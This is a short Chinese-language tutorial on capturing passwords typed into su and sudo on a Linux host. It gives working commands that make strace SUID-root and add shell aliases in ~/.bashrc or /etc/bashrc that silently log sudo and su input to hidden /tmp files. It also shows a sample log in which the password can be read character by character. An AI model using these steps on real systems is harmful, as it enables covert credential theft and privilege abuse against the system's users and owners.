### 收集`su、sudo`等需要提升权限运行的程序的登录凭证

1.给strace程序添加suid权限，即以root权限执行

```bash
# 查看strace文件位置
which strace
/usr/bin/strace
# 添加suid权限
chmod +s /usr/bin/strace

```

2.添加命令别名

```bash
# 添加命令别名
vi ~/.bashrc或者/etc/bashrc
alias sudo='strace -f -e trace=read,write -o /tmp/.sudo-`date '+%d%h%m%s'`.log -s 32 sudo'
alias su='strace -f -e trace=read,write -o /tmp/.su-`date '+%d%h%m%s'`.log -s 32 su'
# 使命令别名立即生效
source ~/.bashrc

```

3.记录的strace文件如下：

```bash
write(6, "[sudo] password for kali: ", 26) = 26
read(6, "i", 1)                         = 1
read(6, "l", 1)                         = 1
read(6, "a", 1)                         = 1
read(6, "k", 1)                         = 1
read(6, "\n", 1)                        = 1

```

4.根据程序运行输出的特征字符串定位密码位置

